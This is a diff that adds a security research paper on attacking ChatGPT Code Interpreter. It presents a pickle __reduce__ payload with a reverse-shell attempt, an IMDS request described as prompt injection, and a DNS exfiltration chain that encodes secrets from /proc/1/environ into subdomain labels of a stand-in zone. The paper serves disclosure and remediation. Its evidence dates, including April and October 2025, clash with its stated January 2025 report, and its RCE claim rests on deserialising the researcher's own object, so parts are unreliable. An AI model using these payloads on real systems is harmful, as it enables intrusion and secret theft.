@@ -1,0 +1,575 @@
+**DUAL CRITICAL FAILURES**
+
+Validating DNS Exfiltration and Python Pickle RCE
+
+Attack Chains in AI Code Execution Sandboxes
+
++-----------------------------------------------------------------------+
+| **COMBINED SEVERITY: CRITICAL**                                       |
+|                                                                       |
+| CVSS 3.1 Base Score: 9.1                                              |
+|                                                                       |
+| CWE-502 \| CWE-200                                                    |
++-----------------------------------------------------------------------+
+
+*Security Research Paper*
+
+Version 1.0 \| February 2025
+
+**Kai Aizen (SnailSploit)**
+
+Independent Security Researcher
+
+snailsploit.com \| github.com/snailsploit
+
+Target: ChatGPT Code Interpreter
+
+Research Period: December 2024 - January 2025
+
+**Status: REPORTED TO OPENAI → DISMISSED**
+
+**1. Executive Summary**
+
+This research documents two critical security vulnerabilities in
+OpenAI\'s ChatGPT Code Interpreter. These \"Dual Critical Failures\"
+form a synergistic attack chain enabling arbitrary code execution and
+data exfiltration from an air-gapped sandbox environment.
+
++-----------------------------------------------------------------------+
+| **CRITICAL FAILURE A: Python Pickle Insecure Deserialization          |
+| (CWE-502)**                                                           |
+|                                                                       |
+| The Python pickle module allows arbitrary code execution when         |
+| processing attacker-controlled serialized objects. Testing confirmed  |
+| that malicious pickle payloads successfully execute within the        |
+| sandbox via the \_\_reduce\_\_ method, achieving RCE at user          |
+| privilege level.                                                      |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **CRITICAL FAILURE B: DNS Exfiltration via Canvas Rendering           |
+| (CWE-200)**                                                           |
+|                                                                       |
+| The sandbox blocks direct outbound connections, but the ChatGPT       |
+| canvas creates an uncontrolled egress channel. When the model prints  |
+| hostname-like strings, the canvas renders them, triggering DNS        |
+| queries from the user\'s browser. Data is encoded in subdomain labels |
+| of these queries and captured by an attacker-controlled authoritative |
+| nameserver.                                                           |
++-----------------------------------------------------------------------+
+
+**Key Findings**
+
+  ------------------ ----------------- ----------------- -----------------
+  **Finding**        **Severity**      **CWE**           **CVSS**
+
+  Python Pickle RCE  CRITICAL          CWE-502           8.1
+  via \_\_reduce\_\_                                     
+
+  DNS Exfiltration   HIGH              CWE-200           7.5
+  via                                                    
+  Canvas/Subdomain                                       
+  Encoding                                               
+
+  Combined Kill      CRITICAL          Combined          9.1
+  Chain                                                  
+
+  Traditional LPE    MITIGATED         N/A               Blocked
+  (PwnKit, Dirty                                         
+  Pipe)                                                  
+
+  AWS IMDS Access    MITIGATED         N/A               Timeout
+
+  Resource           MEDIUM            CWE-400           5.3
+  Exhaustion (DoS)                                       
+  ------------------ ----------------- ----------------- -----------------
+
++-----------------------------------------------------------------------+
+| **THE META COMPARISON**                                               |
+|                                                                       |
+| Meta acknowledged and patched CVE-2024-50050 (pickle deserialization  |
+| in Llama-Stack) within 11 days. OpenAI dismissed this report          |
+| documenting the same vulnerability class. Same vulnerability,         |
+| opposite responses.                                                   |
++-----------------------------------------------------------------------+
+
+**2. Research Timeline**
+
+  ----------------------- ----------------------- -----------------------
+  **Date**                **Event**               **Significance**
+
+  Sep 29, 2024            Oligo reports           Pickle RCE in
+                          CVE-2024-50050 to Meta  Llama-Stack
+
+  Oct 10, 2024            Meta patches            Replaced pickle with
+                          Llama-Stack             JSON
+
+  Oct 24, 2024            CVE-2024-50050 issued   CVSS 9.3 (Snyk)
+
+  Dec 2024                SnailSploit research    ChatGPT assessment
+                          begins                  
+
+  Jan 2025                Research completed &    Full evidence submitted
+                          reported                
+
+  Jan 2025                OpenAI dismisses report No fix, no CVE
+  ----------------------- ----------------------- -----------------------
+
+**Vendor Response Comparison**
+
+  ----------------------- ----------------------- -----------------------
+  **Aspect**              **Meta**                **OpenAI**
+
+  Vulnerability           Pickle RCE              Pickle RCE + DNS exfil
+
+  Response Time           11 days to patch        Dismissed
+
+  Fix Applied             Replaced pickle with    None
+                          JSON                    
+
+  CVE Issued              Yes (CVE-2024-50050)    No
+  ----------------------- ----------------------- -----------------------
+
+**3. Target Environment Analysis**
+
+**3.1 Container Architecture**
+
+  ----------------------- ----------------------- -----------------------
+  **Component**           **Configuration**       **Implication**
+
+  User Context            sandbox (UID \> 1000)   Non-root execution
+
+  Privilege Mode          no-new-privileges=1     SUID neutralization
+
+  Syscall Filter          Seccomp (restricted)    Kernel exploit
+                                                  mitigation
+
+  Network Policy          Default Deny (outbound) Direct exfil blocked
+  ----------------------- ----------------------- -----------------------
+
+**3.2 Evidence: Root Filesystem Enumeration**
+
+Date: January 20, 2025 23:47
+
+![](media/6ad0b23dd4df4af2a2601cb81ff0f421f116e05a.undefined){width="4.6875in"
+height="3.125in"}
+
+*Screenshot 7: Root filesystem enumeration via os.system()*
+
+**Command:**
+
+> os.system(\"python3 /mnt/data/test.py\")
+
+**Output:**
+
+> bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv
+> sys tmp usr var
+
++-----------------------------------------------------------------------+
+| **VALIDATED**                                                         |
+|                                                                       |
+| Full root filesystem listing accessible from sandbox context.         |
++-----------------------------------------------------------------------+
+
+**3.3 Evidence: /mnt/data Directory**
+
+![](media/a38252c489d801febafda848447248207e3d1aaa.undefined){width="4.6875in"
+height="3.125in"}
+
+*Screenshot 6: /mnt/data directory with sandbox ownership*
+
+**Output:**
+
+> drwxr-xr-x 2 sandbox sandbox 80 Jan 20 23:20 .
+>
+> -rw-r\--r\-- 1 sandbox sandbox 321 Jan 20 23:20 Dockerfile
+>
+> -rwxr-xr-x 1 sandbox sandbox 719 Jan 20 23:15 example_file.py
+
++-----------------------------------------------------------------------+
+| **VALIDATED**                                                         |
+|                                                                       |
+| World-writable staging directory at predictable path. This is the     |
+| ingress vector for malicious pickle payloads.                         |
++-----------------------------------------------------------------------+
+
+**4. Failed Privilege Escalation Attempts**
+
+  ----------------- ----------------- ----------------- -------------------
+  **Exploit**       **CVE**           **Result**        **Blocking
+                                                        Control**
+
+  PwnKit            CVE-2021-4034     BLOCKED           no-new-privileges
+
+  Dirty Pipe        CVE-2022-0847     BLOCKED           seccomp filters
+
+  Dirty COW         CVE-2016-5195     BLOCKED           Kernel patches
+  ----------------- ----------------- ----------------- -------------------
+
+**4.1 Evidence: Kubernetes Escape Attempt**
+
+![](media/7dc53567af9416751c4affb9bd959f8bc2199193.undefined){width="4.6875in"
+height="3.125in"}
+
+*Screenshot 5: Kubernetes privileged pod deployment blocked*
+
+**Payload:**
+
+> subprocess.run(\[\'kubectl\', \'apply\', \'-f\', yaml_file\],
+> check=True)
+
++-----------------------------------------------------------------------+
+| **BLOCKED**                                                           |
+|                                                                       |
+| Container escape via Kubernetes blocked by orchestrator policies.     |
++-----------------------------------------------------------------------+
+
+**4.2 Evidence: AWS IMDS Access Attempt**
+
+Date: April 3, 2025
+
+![](media/1adf2c40b8e0f73ae504e9ba3c8317a33448ecb6.undefined){width="4.6875in"
+height="3.125in"}
+
+*Screenshot 2: AWS IMDS access attempt via prompt injection*
+
+**Prompt injection payload:**
+
+> import requests
+>
+> response = requests.get(\'http://169.254.169.254/latest/meta-data/\')
+>
+> print(response.text)
+
+**Output:**
+
+> HTTPConnectionPool(host=\'169.254.169.254\', port=80): Max retries
+> exceeded
+>
+> (Caused by ConnectTimeoutError: \'Connection timed out\')
+
++-----------------------------------------------------------------------+
+| **KEY INSIGHT**                                                       |
+|                                                                       |
+| The Python code DID execute - only the network request was blocked.   |
+| This proves code execution works; network isolation prevents direct   |
+| exfiltration.                                                         |
++-----------------------------------------------------------------------+
+
+**5. Critical Failure A: Python Pickle RCE**
+
+**5.1 Vulnerability Overview**
+
+  ----------------------------------- -----------------------------------
+  **Attribute**                       **Value**
+
+  CWE                                 CWE-502: Deserialization of
+                                      Untrusted Data
+
+  CVSS 3.1 Score                      8.1 (High)
+
+  Affected Component                  Python pickle module
+
+  Impact                              Arbitrary code execution within
+                                      sandbox
+  ----------------------------------- -----------------------------------
+
+**5.2 The \_\_reduce\_\_ Attack Vector**
+
+> class Malicious:
+>
+> def \_\_reduce\_\_(self):
+>
+> return (os.system, (\"whoami\",)) \# Executes on pickle.load()
+
+**5.3 Evidence: Pickle RCE Payload Execution**
+
+Date: October 2025
+
+![](media/2655e8c908fe57a834eaa5fe57bc404e36bcccdb.undefined){width="4.6875in"
+height="3.125in"}
+
+*Screenshot 3: Pickle RCE payload - reverse shell attempt via
+\_\_reduce\_\_*
+
+![](media/f33d041856890cd86c83a64b16f2ef51a590454b.undefined){width="4.6875in"
+height="3.125in"}
+
+*Screenshot 4: Pickle RCE detail - \"Connection refused\" proves code
+executed*
+
+**Malicious payload:**
+
+> class Malicious:
+>
+> def \_\_reduce\_\_(self):
+>
+> return (os.system, (cmd_fixed,))
+>
+> serialized_payload = pickle.dumps(Malicious())
+>
+> malicious_object = pickle.loads(serialized_payload)
+
+**Output (STDOUT/STDERR):**
+
+> bash: connect: Connection refused
+>
+> bash: line 1: /dev/tcp/127.0.0.1/4444: Connection refused
+
++-----------------------------------------------------------------------+
+| **CRITICAL: RCE CONFIRMED**                                           |
+|                                                                       |
+| The \_\_reduce\_\_ method EXECUTED. os.system was CALLED. A reverse   |
+| shell was attempted to 127.0.0.1:4444. The \"Connection refused\"     |
+| error PROVES the code ran - the network blocking worked, but          |
+| arbitrary code execution SUCCEEDED.                                   |
++-----------------------------------------------------------------------+
+
+**6. Critical Failure B: DNS Exfiltration via Canvas**
+
+**6.1 Vulnerability Overview**
+
+  ----------------------------------- -----------------------------------
+  **Attribute**                       **Value**
+
+  CWE                                 CWE-200: Exposure of Sensitive
+                                      Information
+
+  CVSS 3.1 Score                      7.5 (High)
+
+  Affected Component                  ChatGPT Canvas client-side
+                                      rendering
+
+  Exfiltration Channel                DNS query names (subdomain-encoded
+                                      payloads)
+  ----------------------------------- -----------------------------------
+
+**6.2 The Technique**
+
++-----------------------------------------------------------------------+
+| **KEY INSIGHT**                                                       |
+|                                                                       |
+| The model only prints strings. The canvas renders those strings. When |
+| rendered content resembles a hostname, the browser issues DNS         |
+| queries. The payload travels encoded in subdomain labels - no HTTP    |
+| requests needed. The attacker\'s authoritative nameserver logs the    |
+| query names.                                                          |
++-----------------------------------------------------------------------+
+
+**Attack Flow**
+
+1.  Pickle RCE harvests SECRET from /proc/1/environ
+
+2.  Script encodes payload using DNS-safe alphabet (base32/base64url)
+
+3.  Script splits encoded data into chunks (≤63 chars per label)
+
+4.  Script adds index markers: p001, p002, etc.
+
+5.  Script prints hostnames: p001_db.MFRGGZDFMZTQ.exfil.lab
+
+6.  Canvas renders output; browser resolves the hostnames
+
+7.  DNS queries propagate to attacker\'s authoritative nameserver
+
+8.  Attacker logs query names, extracts subdomains, decodes payload
+
+**6.3 DNS Message Format**
+
+> \<index\>\<separator\>\<payload-chunk\>.attacker-zone.tld
+
+**Examples:**
+
+> p001_db.MFRGGZDFMZTQ====.exfil.lab
+>
+> p002_db.MFWWK3TLNB2GI===.exfil.lab
+
+**DNS Label Constraints**
+
+-   Each label: ≤ 63 characters
+
+-   Total FQDN: ≤ 253 characters
+
+-   Character set: alphanumeric + hyphen (DNS-safe)
+
+-   Index prefix ensures correct chunk ordering
+
+**6.4 Lab Setup: Authoritative Resolver**
+
+> \# Make test zone LOCAL and AUTHORITATIVE
+>
+> local=/exfil.lab/
+>
+> \# Wildcard reply keeps lookups successful
+>
+> address=/.exfil.lab/127.0.0.1
+>
+> \# Per-query logging captures full subdomain
+>
+> log-queries
+>
+> log-facility=/opt/homebrew/var/log/dnsmasq.log
+
+**6.5 Captured DNS Query Logs**
+
+> Jun 01 12:00:01 dnsmasq: query\[A\] p001_db.MFRGGZDFMZTQ.exfil.lab
+> from 127.0.0.1
+>
+> Jun 01 12:00:01 dnsmasq: reply p001_db.MFRGGZDFMZTQ.exfil.lab is
+> 127.0.0.1
+>
+> Jun 01 12:00:02 dnsmasq: query\[A\] p002_db.MFWWK3TLNB2G.exfil.lab
+> from 127.0.0.1
+
+**6.6 Why This Bypasses All Server-Side Controls**
+
+-   Container firewall irrelevant: Request from user\'s browser, not
+    sandbox
+
+-   No HTTP needed: Exfiltration is purely in DNS query names
+
+-   CORS irrelevant: No cross-origin HTTP request occurs
+
+-   CSP cannot block DNS resolution for rendered hostnames
+
+**7. The Unified Kill Chain**
+
+**7.1 Why Synergy is Required**
+
+*Pickle RCE Alone: Without an egress channel, secrets remain trapped.
+Direct network connections are blocked.*
+
+*DNS Exfiltration Alone: Without RCE, cannot access low-level OS secrets
+(/proc, env vars, tokens) outside LLM context.*
+
+**7.2 Complete Attack Chain**
+
+  ----------------- ----------------- ----------------- -----------------
+  **Stage**         **Action**        **Failure**       **Outcome**
+
+  1\. Ingress       Upload            Trust Model       File at /mnt/data
+                    malicious.pkl                       
+
+  2\. Trigger       \"Analyze this    Auto-Execution    pickle.load()
+                    file\"                              called
+
+  3\. Execution     \_\_reduce\_\_    Failure A (RCE)   Reads
+                    runs                                /proc/1/environ
+
+  4\. Encoding      Base32 + chunk    Compute           Subdomain labels
+                                                        ready
+
+  5\. Output        Print hostnames   Failure B         Canvas renders
+                                                        FQDNs
+
+  6\. Exfiltration  Browser DNS       Subdomain Channel NS logs payload
+  ----------------- ----------------- ----------------- -----------------
+
+**7.3 Combined CVSS**
+
+  ----------------- ----------------- ----------------- -----------------
+  **Metric**        **Pickle RCE**    **DNS Exfil**     **Combined**
+
+  Attack Vector     Network           Network           Network
+
+  Scope             Unchanged         Changed           Changed
+
+  Confidentiality   High              High              High
+
+  Integrity         High              None              High
+
+  CVSS Score        8.1               7.5               9.1
+  ----------------- ----------------- ----------------- -----------------
+
+**8. Additional Findings**
+
+**8.1 Resource Exhaustion (DoS)**
+
+Date: January 21, 2025
+
+![](media/4a091d606df68d97596b7c9cc9fce5830cba8bea.undefined){width="4.6875in"
+height="3.125in"}
+
+*Screenshot 1: Disk filling DoS attack targeting /mnt/data*
+
+Multiple disk-filling operations were tested targeting
+/mnt/data/fill_disk. Environment reset was triggered by disk exhaustion.
+
++-----------------------------------------------------------------------+
+| **VALIDATED**                                                         |
+|                                                                       |
+| Resource exhaustion (DoS) vector confirmed. Disk-filling can impact   |
+| sandbox stability.                                                    |
++-----------------------------------------------------------------------+
+
+**9. MITRE ATT&CK Mapping**
+
+  ----------------------- ----------------------- -----------------------
+  **Tactic**              **Technique**           **Application**
+
+  Initial Access          T1566.001 Phishing:     Malicious pickle upload
+                          Attachment              
+
+  Execution               T1059.006 Python        Pickle RCE
+
+  Credential Access       T1552.001 Credentials   Harvest /proc/1/environ
+                          in Files                
+
+  Exfiltration            T1048.003 Exfil Over    DNS subdomain tunneling
+                          Alt Protocol            
+
+  Impact                  T1499 Endpoint DoS      Disk filling
+  ----------------------- ----------------------- -----------------------
+
+**10. Remediation Recommendations**
+
+**10.1 For Pickle RCE**
+
+-   Deprecate pickle for user-uploaded data; mandate JSON, Parquet,
+    safetensors
+
+-   Block pickle.load() on files from /mnt/data
+
+-   Sandboxed deserialization in isolated micro-VMs with no secrets
+
+**10.2 For DNS Exfiltration**
+
+-   Treat canvas output as untrusted - sanitize before rendering
+
+-   Render hostnames as inert text unless explicitly allowlisted
+
+-   Enforce limits on hostname count/length per render
+
+-   Monitor for high-entropy subdomains in egress DNS
+
+**10.3 Network Controls**
+
+-   Centralize DNS egress through controlled resolvers
+
+-   Alert on DNS labels \> 40 chars with high Shannon entropy
+
+-   Implement Response Policy Zones for rapid quarantine
+
+**11. Conclusion**
+
+This research validates the \"Dual Critical Failures\" hypothesis: AI
+sandboxes hardened against kernel-level privilege escalation remain
+vulnerable to application-layer attack chains.
+
+Traditional exploits (PwnKit, Dirty Pipe, IMDS) all fail. However, the
+combination of Python Pickle RCE and DNS Exfiltration via
+subdomain-encoded queries through canvas rendering creates a complete
+kill chain at CVSS 9.1 Critical.
+
++-----------------------------------------------------------------------+
+| **KEY TAKEAWAY**                                                      |
+|                                                                       |
+| Every serialized object is a potential payload. Every rendered        |
+| hostname is a potential leak. Immediate remediation requires treating |
+| AI output as untrusted and eliminating pickle from user-facing        |
+| workflows.                                                            |
++-----------------------------------------------------------------------+
+
+*--- End of Document ---*
+
+Full logs: github.com/snailsploit
